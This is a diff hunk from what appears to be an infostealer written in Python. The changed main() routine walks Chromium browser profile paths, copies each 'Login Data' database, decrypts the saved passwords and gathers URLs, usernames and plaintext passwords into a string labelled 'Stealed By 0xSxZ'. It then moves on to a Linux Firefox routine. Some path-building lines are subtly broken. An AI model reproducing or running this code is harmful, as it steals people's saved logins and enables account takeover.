@@ -348,65 +348,71 @@ if yes == "yes":
 			except:
 				return "No Passwords"
 	def main():
+		binks = "==============Stealed By 0xSxZ=============="
 		try:
-			binks = ""
-			db_path =os.environ["USERPROFILE"]+"\\AppData"+ "\\Local"+ "\\Google"+ "\\Chrome"+ "\\User Data"+ "\\Default"+"\\Login Data"
-			if not os.path.exists(db_path):
-				db_path = os.environ["USERPROFILE"]+"\\AppData"+ "\\Local"+ "\\Google"+ "\\Chrome"+ "\\User Data"+ "\\Profile 1"+"\\Login Data"
+			for i in range(len(chromiumpaths)):
+				db_path = str(chromiumpaths[i])+ "\\User Data"+ "\\Default"+"\\Login Data"
+				print(os.path.exists(db_path))
 				if not os.path.exists(db_path):
-					db_path = os.environ["USERPROFILE"]+"\\AppData"+ "\\Local"+ "\\Google"+ "\\Chrome"+ "\\User Data"+ "\\Profile 2"+"\\Login Data"
+					db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1"+"\\Login Data" +"\\Login Data"
 					if not os.path.exists(db_path):
-						return "No Passwords"
-			key = fetching_encryption_key()
-			
-			filename = "ChromePasswords.db"
-			shutil.copyfile(db_path, filename)
-			  
-			# connecting to the database
-			db = sqlite3.connect(filename)
-			cursor = db.cursor()
-			  
-			# 'logins' table has the data
-			cursor.execute(
-				"select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
-				"order by date_last_used")
-			  
-			# iterate over all rows
-			for row in cursor.fetchall():
-				main_url = row[0]
-				login_page_url = row[1]
-				user_name = row[2]
-				decrypted_password = password_decryption(row[3], key)
-				date_of_creation = row[4]
-				last_usuage = row[5]
+						db_path = chromiumpaths[i]+ "\\Login Data"
+						if not os.path.exists(db_path):
+							db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1"+"\\Login Data"
+							if not os.path.exists( str(chromiumpaths[i])+ "\\Login Data"):
+								continue
+
+				print(db_path)
+				key = fetching_encryption_key()
+				
+				filename = "ChromePasswords.db"
+				shutil.copyfile(db_path, filename)
+				# connecting to the database
+				db = sqlite3.connect(filename)
+				cursor = db.cursor()
 				  
-				if user_name or decrypted_password:
-					binks = binks + (f"Main URL: {main_url}\n")
-					binks = binks + (f"Login URL: {login_page_url}\n")
-					binks = binks +(f"User name: {user_name}\n")
-					binks = binks +(f"Decrypted Password: {decrypted_password}\n\n")
+				# 'logins' table has the data
+				cursor.execute(
+					"select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
+					"order by date_last_used")
 				  
-				else:
-					continue
-				  
-				if date_of_creation != 86400000000 and date_of_creation:
-					print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")
-				  
-				if last_usuage != 86400000000 and last_usuage:
-					print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
-				print("=" * 100)
-			cursor.close()
-			db.close()
-			return(binks)
-			try:
-				  
-				# trying to remove the copied db file as 
-				# well from local computer
-				os.remove(filename)
-			except:
-				pass
-		except Exception as e:
+				# iterate over all rows
+				for row in cursor.fetchall():
+					main_url = row[0]
+					login_page_url = row[1]
+					user_name = row[2]
+					decrypted_password = password_decryption(row[3], key)
+					date_of_creation = row[4]
+					last_usuage = row[5]
+					  
+					if user_name or decrypted_password:
+						binks = binks + (f"Main URL: {main_url}\n")
+						binks = binks + (f"Login URL: {login_page_url}\n")
+						binks = binks +(f"User name: {user_name}\n")
+						binks = binks +(f"Decrypted Password: {decrypted_password}\n\n")
+					  
+					else:
+						continue
+					  
+					if date_of_creation != 86400000000 and date_of_creation:
+						print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")
+					  
+					if last_usuage != 86400000000 and last_usuage:
+						print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
+					print("=" * 100)
+				cursor.close()
+				db.close()
+				
+				try:
+					  
+					# trying to remove the copied db file as 
+					# well from local computer
+					os.remove(filename)
+				except:
+					pass
+		except ZeroDivisionError as e:
 	  		return str(e)
+		return binks
 	def PasswLinux():
 		try:
 			FirefoxPath = os.path.expanduser("~/.mozilla/firefox/")
